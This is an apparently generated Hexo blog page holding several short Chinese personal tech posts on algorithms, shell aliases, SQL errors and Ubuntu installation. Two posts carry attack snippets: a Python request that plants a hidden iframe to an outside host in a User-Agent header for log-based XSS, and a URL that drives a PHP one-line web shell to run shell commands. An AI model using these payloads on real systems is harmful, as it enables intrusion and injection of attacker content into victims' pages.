@@ -1,0 +1,561 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://yoursite.com/page/14/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Hexo">
+  
+    <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  <link rel="stylesheet" href="/css/style.css">
+  
+
+</head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" results="0" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main">
+  
+    <article id="post-xss日志攻击" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/03/26/xss日志攻击/" class="article-date">
+  <time datetime="2017-03-26T07:32:46.000Z" itemprop="datePublished">2017-03-26</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>title:xss日志攻击<br>date:2016-04-12 04:08:04<br>    import requests as req</p>
+<pre><code>head = {&apos;user-gent&apos;:&apos;Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8b) Gecko/20050118 Firefox/1.0+ &lt;iframe src=&quot;http://raidshx.top/vic/&quot; style=&quot;display:none&quot;&gt;&lt;/iframe&gt;&apos;}
+req.get(&quot;http://raidshx.top&quot;,header = head)
+</code></pre>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2017/03/26/xss日志攻击/" data-id="cj0ryfucu003mc6oto339mloa" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-zsh切换目录自动列出文件" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/03/26/zsh切换目录自动列出文件/" class="article-date">
+  <time datetime="2017-03-26T07:32:46.000Z" itemprop="datePublished">2017-03-26</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>title:zsh切换目录自动列出文件<br>date:2016-09-25 06:42:03</p>
+<p>每次cd后 总要敲ls ，烦。</p>
+<p>cdl() {<br>    cd “${1}”;<br>    ls -l;<br>}<br>alias cd=cdl<br>将上述内容添加到用户主目录中的.zshrc中即可。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2017/03/26/zsh切换目录自动列出文件/" data-id="cj0ryfucw003nc6otlla5ac2k" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-一句话木马的使用方式" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/03/26/一句话木马的使用方式/" class="article-date">
+  <time datetime="2017-03-26T07:32:46.000Z" itemprop="datePublished">2017-03-26</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>title:一句话木马的使用方式<br>date:2016-08-05 13:03:28<br><a href="http://127.0.0.1/tex/Admin/index?code=print_r(`ls%20-l`" target="_blank" rel="external">http://127.0.0.1/tex/Admin/index?code=print_r(`ls%20-l`</a>);</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2017/03/26/一句话木马的使用方式/" data-id="cj0ryfud3003oc6otm50fljjm" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-一个友好的防转载" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/03/26/一个友好的防转载/" class="article-date">
+  <time datetime="2017-03-26T07:32:46.000Z" itemprop="datePublished">2017-03-26</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>title:一个友好的防转载<br>date:2016-03-04 02:53:41<br>    &lt;?php<br>    function rands()<br>    {<br>    return md5(microtime());<br>    }<br>    $content=”安康市丢啊是 撒谎的卡上初中委屈 阿苏出我 自行车能尽快ir在 阿萨德就卡机哦亲文化”;<br>    $cons=explode(“ “,$content);<br>    foreach ($cons as $key)<br>    {<br>        echo $key.’ <font color="white" style="font-size:0px">‘.rands().’</font>‘;<br>    }<br>    ?&gt;  </p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2017/03/26/一个友好的防转载/" data-id="cj0ryfud5003pc6otvupljgmm" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-一次奇怪的SQL错误" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/03/26/一次奇怪的SQL错误/" class="article-date">
+  <time datetime="2017-03-26T07:32:46.000Z" itemprop="datePublished">2017-03-26</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>title:一次奇怪的SQL错误<br>date:2016-03-04 02:34:15<br>昨晚在写插入语句的时候，发现怎么插入也不行，在sql终端执行时<br>出现了You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘true)values (0,’1’,1)’ at line 1的错误，</p>
+<p>而我的sql语句是这么写的：<br>insert into quizContest (problemId,user,true)values (0,’1’,1);</p>
+<p>后来在舍友的提示下，修改了true字段名，语句通过了。SQL的保留字在创建表时不会提示，但是在查询和插入时可能出错。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2017/03/26/一次奇怪的SQL错误/" data-id="cj0ryfud6003qc6ot09o8b93a" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-个人书单整理" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/03/26/个人书单整理/" class="article-date">
+  <time datetime="2017-03-26T07:32:46.000Z" itemprop="datePublished">2017-03-26</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>title:个人书单整理<br>date:2016-01-21 10:32:20</p>
+<blockquote>
+<p>《囚徒健身》</p>
+<p>《[特种部队徒手格斗术].王红辉》</p>
+<p>《[Head.First.PHP.&amp;.MySQL].Lynn.Beighley.》</p>
+<p>《论游击战》</p>
+<p>《实战突击.php项目开发案例整合》</p>
+<p>《用户体验的要素 －以用户为中心的Web设计》</p>
+<p>《Metasploit渗透测试魔鬼训练营》</p>
+<p>《[Gnu.Emacs].Learn_GNU_Emacs》</p>
+<p>《程序员的呐喊 》</p>
+<p>《程序员的思维修炼》</p>
+<p>《机器学习实战》</p>
+<p>《吉他入门经典教程》</p>
+<p>《数学之美》</p>
+</blockquote>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2017/03/26/个人书单整理/" data-id="cj0ryfud6003rc6oto5l0gfxi" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-二分法查找" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/03/26/二分法查找/" class="article-date">
+  <time datetime="2017-03-26T07:32:46.000Z" itemprop="datePublished">2017-03-26</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>title:二分法查找<br>date:2016-06-03 03:28:17</p>
+<pre><code>#include&lt;iostream&gt;
+using namespace std;
+bool finds(int p[], int len ,int target)
+{
+    if(len == 0)
+        return false;
+    if(p[len/2] &lt; target)
+        return finds(p+len/2,len/2,target);
+    if(p[len/2] &gt; target)
+        return finds(p,len/2,target);
+    return true;
+}
+int tmp[] = {1,2,3,4,5,6,7,8,9};
+int main()
+{
+    cout&lt;&lt;finds(tmp,9,5);
+    cout&lt;&lt;finds(tmp,9,555);
+
+}
+</code></pre>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2017/03/26/二分法查找/" data-id="cj0ryfud7003sc6otijg632vl" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-二次快速幂(c++\Python)" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/03/26/二次快速幂(c++\Python)/" class="article-date">
+  <time datetime="2017-03-26T07:32:46.000Z" itemprop="datePublished">2017-03-26</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>title:二次快速幂(c++\Python)<br>date:2016-01-23 03:36:52<br>快速幂的思想是将指数分解，然后将几个小的指数得到的结果合并 来达到加速开方的目的。</p>
+<p>百度百科上的二次快速幂：</p>
+<pre><code>#include &lt;iostream&gt;
+int pow2(int ,int );
+int main(void)
+{
+    std::cout&lt;&lt;pow2(2,7);
+}
+int pow2(int num,int s)
+{
+    int r = 1,base = num;
+    while(s != 0)
+    {
+        if(s%2)//如果是奇数，就先把结果乘以自身（整理为一堆偶数的快速幂）
+            r*=base;
+        base*=base;//base变为base的平方
+        s/=2;
+    }
+    return r;
+}
+</code></pre><p>计算步骤：<br>2的7次幂：<br>1.7是奇数 r = 2<br>2.base = 2^2 = 4<br>3.s = 3<br>4.3是奇数 r = 8<br>5.base = 4^4 = 16<br>6.s = 1<br>7.1是奇数 r = 128<br>8.s = 0 返回r结束<br>计算步骤只有 2， 5 ，7 三步<br>相比普通的7步快了接近一倍</p>
+<p>Python:</p>
+<pre><code>def pow(num , s):
+    r = 1
+    base = num
+    while s != 0 :
+        if s%2 == 1:
+            r *= base
+        base *= base
+        s /= 2
+        s = int(s)
+    return r
+print(pow(2,9))
+</code></pre>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2017/03/26/二次快速幂(c++\Python)/" data-id="cj0ryfud8003tc6otm3479cvh" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-二分图的判定" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/03/26/二分图的判定/" class="article-date">
+  <time datetime="2017-03-26T07:32:46.000Z" itemprop="datePublished">2017-03-26</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>title:二分图的判定<br>date:2016-05-24 13:49:26</p>
+<pre><code>#include &lt;stdio.h&gt;
+#include &lt;iostream&gt;
+#include &lt;map&gt;
+#include &lt;vector&gt;
+#include &lt;algorithm&gt;
+using std::vector;
+using std::map;
+
+std::map&lt;int, std::vector&lt;int&gt; &gt; data;
+bool *color;
+bool is2f(true);
+
+void init()
+{
+  // for(int i=0;i&lt;100;i++)
+  // {
+  //   for(int k=0;k&lt;=100;k++)
+  //     {
+  //       data[i].push_back(k);
+  //     }
+  // }
+  data[0].push_back(1);
+  data[1].push_back(2);
+  data[1].push_back(3);
+  //data[2].push_back(3);
+}
+
+
+bool *visited;
+void dfsColor(int n,bool clr=true)
+{
+
+  if(NULL == color)
+    color = new bool[data.size()];
+  if(NULL == visited)
+    visited = new bool[data.size()];
+  if(visited[n] == true)
+    return;
+  else
+    visited[n] = true;
+  std::cout&lt;&lt;&quot;-&gt;&quot;&lt;&lt;n;
+  for (int i = 0; i &lt; data[n].size(); ++i)
+  {
+    if(color[data[n][i]]==clr)
+    {
+      is2f = false;
+      return;
+    }
+    dfsColor(data[n][i],1-clr);
+  }
+}
+
+int main(int argc, char const *argv[])
+{
+  /* code */
+  init();
+  //dfs(12);
+  dfsColor(1);
+  std::cout&lt;&lt;std::endl&lt;&lt;is2f;
+  return 0;
+}
+</code></pre><p>原理：在深度搜索的同时，为每一个节点标记与其父节点不同的颜色，如果遇到相同颜色的节点相邻，则判断为不是二分图，否则是二分图。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2017/03/26/二分图的判定/" data-id="cj0ryfud8003uc6oth28nq36c" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-优盘安装ubuntu server" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/03/26/优盘安装ubuntu server/" class="article-date">
+  <time datetime="2017-03-26T07:32:46.000Z" itemprop="datePublished">2017-03-26</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>title:优盘安装ubuntu server<br>date:2016-04-10 01:43:29<br>用U盘安装ubuntu server时，会出现找不到光盘的情况：</p>
+<p>解决方案：</p>
+<p>1.切换到shell运行环境</p>
+<p>2.cd /dev/</p>
+<p>3.ls sd<em> 此时看看最后两个的sd</em>是什么 比如（sdd sdd4）</p>
+<p>4.cd /    mount /dev/sdd4 /usb（刚刚出现的那个）</p>
+<p>5.将你优盘中的iso文件挂载到cdrom即可：</p>
+<p>mount /usb/ubuntu-server-xxxxx.iso /cdrom</p>
+<p>exit</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2017/03/26/优盘安装ubuntu server/" data-id="cj0ryfud9003vc6otxn39qfgp" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+  
+    <nav id="page-nav">
+      <a class="extend prev" rel="prev" href="/page/13/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/12/">12</a><a class="page-number" href="/page/13/">13</a><span class="page-number current">14</span><a class="page-number" href="/page/15/">15</a><a class="page-number" href="/page/16/">16</a><span class="space">&hellip;</span><a class="page-number" href="/page/18/">18</a><a class="extend next" rel="next" href="/page/15/">Next &raquo;</a>
+    </nav>
+  
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  
+    
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/03/">March 2017</a><span class="archive-list-count">173</span></li></ul>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recents</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2017/03/26/c++ std::random_shuffle()实现/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2017/03/26/About/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2017/03/26/Ajax模板/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2017/03/26/Bing背景图片API/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2017/03/26/Django教程：创建投票App Part 2/">(no title)</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2017 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+  </div>
+</body>
+</html>
